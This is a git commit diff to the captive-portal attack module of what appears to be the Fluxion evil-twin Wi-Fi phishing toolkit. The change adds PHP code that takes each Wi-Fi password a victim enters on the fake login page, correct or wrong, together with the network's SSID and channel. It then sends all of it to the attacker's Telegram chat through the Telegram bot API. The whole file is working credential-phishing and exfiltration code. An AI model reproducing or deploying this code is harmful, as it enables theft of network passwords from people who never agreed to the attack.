6893429f3d92ae8c77c7863ae94c8a8df5e09024
datrix88 <datrix88@gmail.com>
2023-04-04 15:43:30 +0200

    Update check.php
    Added function and options for sending telegram notifications

--- attacks/Captive Portal/lib/check.php
+++ attacks/Captive Portal/lib/check.php
@@ -1,8 +1,27 @@
 <?php
-	require_once("authenticator.php");
+    require_once("authenticator.php");
+	
+    $config_telegram = parse_ini_file("telegram.conf");
 
-	switch ($candidate_key_result) {
-		# case "1": header("Location:error.html"); break;
-		case "2": header("Location:final.html"); break;
-		default: header("Location:error.html"); break;
-	}
+    function telegram($msg, $telegrambot, $telegramchatid){
+      $url='https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data=array('chat_id'=>$telegramchatid,'text'=>$msg,'parse_mode'=>'html');
+      $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
+      $context=stream_context_create($options);
+      $result=file_get_contents($url,false,$context);
+      return $result;
+    }
+    
+    $hostapd_path = array_map('basename', glob("$FLUXIONWorkspacePath/*hostapd.conf", GLOB_BRACE));
+    $hostapd_file = parse_ini_file("$FLUXIONWorkspacePath/".$hostapd_path[0]);
+    $network_info = "<b>Network: </b>".$hostapd_file["ssid"].PHP_EOL."<b>Channel: </b>".$hostapd_file["channel"].PHP_EOL.PHP_EOL;
+     
+    if($candidate_key_result == "2"){
+       if($config_telegram["enable"] == "1")
+           telegram ($network_info."<b>Correct Password:</b>".PHP_EOL."<code>".$candidate_key."</code>", $config_telegram["telegramAPIBot"], $config_telegram["telegramUserId"]);
+       header("Location:final.html");
+    }
+    else{
+       if($config_telegram["enable"] == "1")
+           telegram ($network_info."<b>Error Password:</b>".PHP_EOL."<code>".$candidate_key."</code>", $config_telegram["telegramAPIBot"], $config_telegram["telegramUserId"]);
+       header("Location:error.html");
+    }
